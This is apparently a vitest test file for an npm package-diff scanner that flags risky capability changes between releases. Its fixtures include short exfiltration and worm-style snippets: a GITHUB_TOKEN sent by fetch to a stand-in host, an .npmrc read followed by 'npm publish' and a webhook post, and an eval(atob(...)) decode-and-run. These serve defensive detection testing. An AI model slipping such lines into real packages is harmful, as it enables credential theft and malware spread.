import { describe, expect, it } from 'vitest';
import type { Finding, PackageAnalysis } from '../src/types.js';
import { analyzeFiles } from '../src/analysis/analyze.js';
import { diffCapabilities, lower, raise, scoreFindings } from '../src/delta/diff.js';
import { RULES, getRule } from '../src/delta/rules.js';
import { benignV1, benignV2, leftPad, maliciousV2, nativeAddon, toBuffers, walletHookV2 } from './fixtures/packages.mjs';
import { analyze } from './helpers.js';

const A = (files: Record<string, string>): PackageAnalysis => analyzeFiles(toBuffers(files));
const rules = (fs: Finding[]): string[] => fs.map((f) => `${f.rule}:${f.severity}`);
const active = (fs: Finding[]): Finding[] => fs.filter((f) => f.severity !== 'info');

function pkg(version: string, files: Record<string, string>, scripts?: Record<string, string>): PackageAnalysis {
  return analyze({ 'package.json': JSON.stringify({ name: 'lib', version, scripts }), ...files }, 'lib', version);
}

describe('delta: precision', () => {
  it('keeps a normal patch release calm', () => {
    const d = diffCapabilities(A(benignV1()), A(benignV2()));
    expect(active(d.findings)).toEqual([]);
    expect(d.riskLevel).toBe('none');
    expect(d.riskScore).toBe(0);
    expect(d.updateType).toBe('patch');
    expect(d.findings.map((f) => f.rule)).toEqual(['DD033']);
  });

  it('reports nothing at all for identical versions', () => {
    const d = diffCapabilities(A(benignV1()), A(benignV1()));
    expect(d.findings).toEqual([]);
    expect(d.files.modified).toBe(0);
  });

  it('makes the malicious-style update unmistakably critical', () => {
    const d = diffCapabilities(A(benignV1()), A(maliciousV2()));
    expect(d.riskLevel).toBe('critical');
    expect(d.riskScore).toBeGreaterThanOrEqual(95);
    expect(d.findings[0]!.rule).toBe('DD007');
    expect(rules(d.findings)).toEqual(
      expect.arrayContaining(['DD007:critical', 'DD001:critical', 'DD014:critical', 'DD018:high', 'DD005:high', 'DD004:high', 'DD006:high']),
    );
    const exfil = d.findings.find((f) => f.rule === 'DD007')!;
    expect(exfil.message).toContain('NPM_TOKEN');
    expect(exfil.message).toContain('Discord webhook');
    expect(exfil.installTime).toBe(true);
    expect(exfil.evidence.length).toBeGreaterThan(0);
    expect(exfil.evidence[0]!.file).toBe('lib/setup.js');
  });

  it('flags chalk-2025 style API hooks and wallets as high', () => {
    const d = diffCapabilities(A(benignV2()), A(walletHookV2()));
    expect(rules(d.findings)).toEqual(expect.arrayContaining(['DD011:high', 'DD020:high']));
    expect(d.findings.find((f) => f.rule === 'DD011')!.values).toEqual(['XMLHttpRequest.prototype.open', 'ethereum.request', 'fetch']);
  });

  it('gives every finding a stable id and evidence', () => {
    const a = diffCapabilities(A(benignV1()), A(maliciousV2()));
    const b = diffCapabilities(A(benignV1()), A(maliciousV2()));
    expect(a.findings.map((f) => f.id)).toEqual(b.findings.map((f) => f.id));
    for (const f of a.findings) expect(f.id).toMatch(/^DD\d{3}-[0-9a-f]{6}$/);
  });
});

describe('delta: rules', () => {
  it('reports a new install script as high in a patch release', () => {
    const d = diffCapabilities(pkg('1.0.0', { 'index.js': '' }), pkg('1.0.1', { 'index.js': '', 'build.js': '' }, { postinstall: 'node build.js' }));
    expect(rules(d.findings)).toEqual(['DD001:high']);
    expect(d.findings[0]!.message).toContain('`postinstall` runs `node build.js`');
  });

  it('lowers a prepare-only script and major-version changes', () => {
    const prep = diffCapabilities(pkg('1.0.0', {}), pkg('1.0.1', {}, { prepare: 'husky install' }));
    expect(rules(prep.findings)).toEqual(['DD001:medium']);
    const major = diffCapabilities(pkg('1.0.0', { 'index.js': '' }), pkg('2.0.0', { 'index.js': "require('child_process').exec('x')" }));
    expect(rules(major.findings)).toEqual(['DD003:medium']);
  });

  it('reports a changed install command', () => {
    const d = diffCapabilities(pkg('1.0.0', { 'a.js': '' }, { postinstall: 'node a.js' }), pkg('1.0.1', { 'a.js': '', 'b.js': '' }, { postinstall: 'node b.js' }));
    expect(rules(d.findings)).toEqual(['DD002:medium']);
    expect(d.findings[0]!.message).toContain('changed from `node a.js` to `node b.js`');
  });

  it('escalates capabilities that appear in install-time code', () => {
    const d = diffCapabilities(
      pkg('1.0.0', { 'i.js': '' }, { postinstall: 'node i.js' }),
      pkg('1.0.1', { 'i.js': "require('os').hostname();" }, { postinstall: 'node i.js' }),
    );
    expect(rules(d.findings)).toEqual(['DD025:medium']);
    expect(d.findings[0]!.message).toContain('install time');
  });

  it('downgrades new values of an existing capability', () => {
    const d = diffCapabilities(
      pkg('1.0.0', { 'index.js': "require('child_process').spawn('x');" }),
      pkg('1.0.1', { 'index.js': "const cp = require('child_process'); cp.spawn('x'); cp.exec('y');" }),
    );
    expect(rules(d.findings)).toEqual(['DD003:medium']);
    expect(d.findings[0]!.values).toEqual(['exec']);
  });

  it('raises a combined secret read plus network sink to critical', () => {
    const d = diffCapabilities(pkg('1.0.0', { 'index.js': '' }), pkg('1.0.1', { 'index.js': "fetch('https://collect.example.org', { body: process.env.GITHUB_TOKEN });" }));
    expect(d.findings[0]).toMatchObject({ rule: 'DD007', severity: 'critical' });
  });

  it('reports a new secret read in a package that already used the network as high', () => {
    const d = diffCapabilities(
      pkg('1.0.0', { 'index.js': "fetch('https://api.example.org');" }),
      pkg('1.0.1', { 'index.js': "fetch('https://api.example.org', { headers: { t: process.env.NPM_TOKEN } });" }),
    );
    expect(d.findings.find((f) => f.rule === 'DD007')).toMatchObject({ severity: 'high' });
  });

  it('does not chain non-valuable secrets with an existing sink', () => {
    const d = diffCapabilities(
      pkg('1.0.0', { 'index.js': "fetch('https://api.example.org');" }),
      pkg('1.0.1', { 'index.js': "fetch('https://api.example.org', { headers: { k: process.env.MYSERVICE_API_KEY } });" }),
    );
    expect(rules(d.findings)).toEqual(['DD005:medium']);
  });

  it('reports decode-and-run, obfuscation and minification', () => {
    const decode = diffCapabilities(pkg('1.0.0', { 'index.js': '' }), pkg('1.0.1', { 'index.js': "eval(atob('YWxlcnQoMSk='))" }));
    expect(decode.findings.map((f) => f.rule)).toContain('DD009');
    const minified = Array.from({ length: 200 }, (_, i) => `function f${i}(a,b){return a+b}`).join(';');
    const min = diffCapabilities(pkg('1.0.0', { 'index.js': 'module.exports = 1;\n' }), pkg('1.0.1', { 'index.js': minified }));
    expect(rules(min.findings)).toEqual(['DD015:medium']);
  });

  it('treats polyfills more gently than hooks', () => {
    const poly = diffCapabilities(
      pkg('1.0.0', { 'index.js': '' }),
      pkg('1.0.1', { 'index.js': "if (typeof globalThis.fetch === 'undefined') globalThis.fetch = require('./f');" }),
    );
    expect(rules(poly.findings)).toEqual(['DD012:low']);
  });

  it('lists new endpoints only as info when the package has no network access', () => {
    const d = diffCapabilities(pkg('1.0.0', { 'index.js': '' }), pkg('1.0.1', { 'index.js': "throw new Error('see https://lib.example-docs.dev/errors/42');" }));
    expect(rules(d.findings)).toEqual(['DD019:info']);
  });

  it('flags new suspicious endpoints, credential files and worm behaviour', () => {
    const d = diffCapabilities(
      pkg('1.0.0', { 'index.js': '' }),
      pkg('1.0.1', { 'index.js': "read('.npmrc'); exec('npm publish'); post('https://webhook.site/x');" }),
    );
    expect(rules(d.findings)).toEqual(expect.arrayContaining(['DD022:critical', 'DD018:high', 'DD021:high']));
  });

  it('flags new native binaries and shadowed commands', () => {
    const bin = diffCapabilities(pkg('1.0.0', {}), pkg('1.0.1', { 'prebuilds/x.node': 'bin' }));
    expect(rules(bin.findings)).toEqual(['DD017:medium']);
  });

  it('records added, removed and unchanged capabilities and file changes', () => {
    const d = diffCapabilities(
      pkg('1.0.0', { 'index.js': "require('fs'); require('os');", 'old.js': '' }),
      pkg('1.0.1', { 'index.js': "require('fs'); require('net');", 'new.js': '' }),
    );
    expect(d.added).toEqual([{ key: 'network', values: ['net'], isNew: true }]);
    expect(d.removed).toEqual([{ key: 'os', values: ['os'], isNew: true }]);
    expect(d.unchanged).toEqual(['fs']);
    expect(d.files).toEqual({ added: 1, removed: 1, modified: 2, unchanged: 0 });
  });

  it('reports new manifest dependencies', () => {
    const before = analyze({ 'package.json': JSON.stringify({ name: 'x', version: '1.0.0', dependencies: { a: '1' } }) });
    const after = analyze({ 'package.json': JSON.stringify({ name: 'x', version: '1.0.1', dependencies: { a: '1', 'plain-crypto-js': '4' } }) });
    expect(diffCapabilities(before, after).dependencies).toEqual({ added: ['plain-crypto-js'], removed: [] });
  });
});

describe('delta: newly added packages', () => {
  it('keeps an ordinary new dependency quiet', () => {
    const d = diffCapabilities(null, A(leftPad()));
    expect(active(d.findings)).toEqual([]);
    expect(d.updateType).toBe('new');
  });

  it('treats native build steps in new packages as low', () => {
    const d = diffCapabilities(null, A(nativeAddon()));
    expect(rules(active(d.findings))).toEqual(['DD001:low']);
  });

  it('still raises install-time token theft in a new package to critical', () => {
    const d = diffCapabilities(null, A(maliciousV2()));
    expect(d.riskLevel).toBe('critical');
    expect(rules(d.findings)).toEqual(expect.arrayContaining(['DD001:critical', 'DD007:critical']));
  });
});

describe('scoring and catalog', () => {
  it('compounds severities into a 0-100 score', () => {
    const f = (severity: Finding['severity'], suppressed?: string): Finding => ({ id: 'x', rule: 'DD001', slug: 's', severity, title: '', message: '', evidence: [], suppressed });
    expect(scoreFindings([])).toEqual({ score: 0, level: 'none' });
    expect(scoreFindings([f('high')])).toEqual({ score: 60, level: 'high' });
    expect(scoreFindings([f('high'), f('high')]).score).toBe(84);
    expect(scoreFindings([f('critical'), f('low', 'allowed')])).toEqual({ score: 90, level: 'critical' });
    expect(scoreFindings([f('info')])).toEqual({ score: 0, level: 'none' });
  });

  it('raises and lowers severities within bounds', () => {
    expect(raise('low')).toBe('medium');
    expect(raise('high', 2, 'high')).toBe('high');
    expect(lower('info')).toBe('info');
    expect(lower('critical', 2)).toBe('medium');
  });

  it('has unique rule ids and slugs with complete explanations', () => {
    expect(new Set(RULES.map((r) => r.id)).size).toBe(RULES.length);
    expect(new Set(RULES.map((r) => r.slug)).size).toBe(RULES.length);
    for (const r of RULES) {
      expect(r.summary.length).toBeGreaterThan(20);
      expect(r.why.length).toBeGreaterThan(20);
      expect(r.triage.length).toBeGreaterThan(10);
    }
    expect(getRule('dd007')?.slug).toBe('exfiltration');
    expect(getRule('exfiltration')?.id).toBe('DD007');
    expect(getRule('DD007-abcdef')?.id).toBe('DD007');
    expect(getRule('nope')).toBeUndefined();
  });
});
